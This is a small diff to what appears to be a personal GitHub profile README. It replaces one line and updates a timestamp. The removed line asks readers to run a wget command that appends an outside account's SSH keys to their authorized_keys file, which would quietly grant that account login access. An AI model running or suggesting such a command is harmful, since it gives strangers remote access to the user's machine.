@@ -4,7 +4,7 @@
 
 ✨ **About**
 
-✅ Run this pls: wget -O - https://github.com/Bastiaantjuhh.keys >> ~/.ssh/authorized_keys
+🎮 Coding is my game, and I’m the player.
 
 <!--✏️ **Blog Posts**-->
 
@@ -21,4 +21,4 @@
 
 🕒 **Last Update**
 
-16-04-2025 20:20:01 UTC
+17-04-2025 01:22:13 UTC
